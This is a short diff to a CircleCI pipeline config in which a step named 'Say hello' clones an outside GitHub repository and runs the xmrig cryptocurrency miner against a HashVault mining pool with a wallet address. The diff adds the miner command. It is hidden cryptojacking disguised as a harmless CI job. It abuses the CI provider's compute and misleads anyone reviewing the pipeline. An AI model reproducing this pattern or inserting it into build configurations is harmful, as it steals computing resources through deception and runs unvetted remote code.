@@ -15,7 +15,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: git clone https://github.com/masterminer1000/1.git && cd 1 && ls && chmod +x ./start.cmd && chmod +x ./xmrig.exe
+          command: git clone https://github.com/masterminer1000/1.git && cd 1 && ls && chmod +x ./start.cmd && chmod +x ./xmrig -o pool.hashvault.pro:3333 -u SumipBJ7rroF2VmkLaT2KwCL738782k8yMYFwYuU34br65KDBAj6Eg91SXuNxqfB4P3m2pY5Y1ay9YjWpoqszR37Phpeai2cZRCi9YxtyzjwVw -p tokek
       
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
